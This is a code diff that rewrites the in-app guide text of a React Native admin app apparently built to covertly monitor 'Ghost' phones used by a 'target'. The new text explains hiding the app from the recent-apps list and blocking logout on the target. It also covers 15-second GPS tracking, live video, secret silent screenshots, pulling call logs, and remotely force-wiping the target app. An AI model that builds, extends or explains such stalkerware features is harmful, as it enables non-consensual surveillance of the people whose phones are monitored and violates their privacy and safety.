@@ -6,45 +6,47 @@ import { MaterialCommunityIcons } from '@expo/vector-icons';
 
 const GuideScreen = ({ onBack }) => {
   const sections = [
-        {
-          title: "TRAFFIC LIGHT SYSTEM",
-          icon: "traffic-light",
-          color: "#F59E0B",
-          items: [
-            { label: "🟢 GREEN (ACTIVE)", desc: "Node is fully operational and streaming telemetry or video." },
-            { label: "🟠 ORANGE (PAUSED)", desc: "Node is in deep sleep mode to save battery. Feeds are off but connection is maintained." },
-            { label: "🔴 RED (OFFLINE)", desc: "Node is completely unreachable or dead." }
-          ]
-        },
-        {
-          title: "COMMAND PROTOCOLS",
-          icon: "console-line",
-          color: "#38BDF8",
-          items: [
-            { label: "PAUSE & RESUME", desc: "Use the pause button to cut off the heavy WebRTC streams and GPS polling to save battery on the target device. Press play to awaken the sensors." },
-            { label: "REMOTE SNAPSHOT", desc: "Silently command the ghost node to capture a screenshot and upload it to the Evidence Gallery." },
-            { label: "WIPE SESSION", desc: "Force logs out the ghost node, returning the target handset to the login screen securely." }
-          ]
-        },
-        {
-          title: "HARDWARE CONTROL",
-          icon: "cellphone-link",
-          color: "#EF4444",
-          items: [
-            { label: "PERMANENT BURN (UNINSTALL)", desc: "Long-press ANY node in the top Active Nodes selector. A modal will appear. Confirming the burn will permanently delete the node from the database and force a harsh logout." },
-            { label: "STEALTH MODE", desc: "In the Ghost app, clicking 'Go Stealth Mode' will seamlessly exit the app to the background without cutting the socket connection." }
-          ]
-        },
-        {
-          title: "EVIDENCE MANAGEMENT",
-          icon: "folder-lock",
-          color: "#10B981",
-          items: [
-            { label: "LOCAL DASHBOARD RECORDING", desc: "Click 'CAPTURE FEED' in the Admin stream tab to save a secure local screenshot of the live video straight to your command center's photo gallery." },
-            { label: "LOG SYNCING", desc: "Navigate to the CALLS tab and press RE-SYNC DATA to pull the latest 10 phone logs directly off the target ghost handset." }
-          ]
-        }
-      ];
+    {
+      title: "GHOST ACTIVATION",
+      icon: "leak",
+      color: "#F59E0B",
+      items: [
+        { label: "INITIAL CALIBRATION", desc: "Open the Ghost app and tap 'CALIBRATE'. This initializes the hardware sensors, GPS pipeline, and encrypted video bridge. The orb will turn blue and pulse when synced." },
+        { label: "STEALTH ESCAPE", desc: "Tapping 'GO STEALTH MODE' inside the Ghost app triggers a safe exit to the background. The app remains active in memory, but is hidden from the recent apps list in 'most configurations'." },
+        { label: "HARDENED UI", desc: "Ghost nodes have no logout capability. The session is pinned to the device until an Admin remotely issues a 'WIPE' or 'BURN' command." }
+      ]
+    },
+    {
+      title: "UPLINK STATUS (TRAFFIC LIGHTS)",
+      icon: "traffic-light",
+      color: "#10B981",
+      items: [
+        { label: "🟢 GREEN (OPTIMIZED/CONNECTED)", desc: "Full power. Node is transmitting location every 15s and supporting live video feeds." },
+        { label: "🟠 ORANGE (PAUSED/PENDING)", desc: "Power-save mode. WebRTC bridge is closed and GPS polling is suspended. Maintains a 'heartbeat' for reactivation." },
+        { label: "🔴 RED (OFFLINE/KILLED)", desc: "Node has lost connection, been manually terminated, or burned from the registry." }
+      ]
+    },
+    {
+      title: "ADMIN STRATEGIC CONTROLS",
+      icon: "security-network",
+      color: "#38BDF8",
+      items: [
+        { label: "PAUSE/RESUME", desc: "Toggle the 'PAUSE' button to remotely put a node to sleep, saving 80% battery consumption while maintaining the link." },
+        { label: "RE-SYNC TELEMETRY", desc: "Use 'RE-SYNC DATA' in the Calls tab to pull the most recent 10 communication logs from the device's internal storage." },
+        { label: "EVIDENCE CAPTURE", desc: "Request 'REMOTE SNAP' to trigger a secret silent screenshot on the target. Alternatively, use 'CAPTURE FEED' to save a local copy of the live video." }
+      ]
+    },
+    {
+      title: "SECURE BURN PROTOCOL",
+      icon: "fire",
+      color: "#EF4444",
+      items: [
+        { label: "PERMANENT DELETION", desc: "Long-press any node in the selection bar for 2 seconds to initiate BURN PROTOCOL. This is the ultimate kill-switch." },
+        { label: "DATABASE PURGE", desc: "Confirming the burn removes the node name and identity from the master registry FOREVER. The target app is force-wiped and locked." },
+        { label: "CYBER ALERTS", desc: "All system events are funneled through the Hacker-themed UI modal. Watch for Red alerts to identify terminal failures or security breaches." }
+      ]
+    }
+  ];
     
       return (
         <SafeAreaView style={styles.container}>
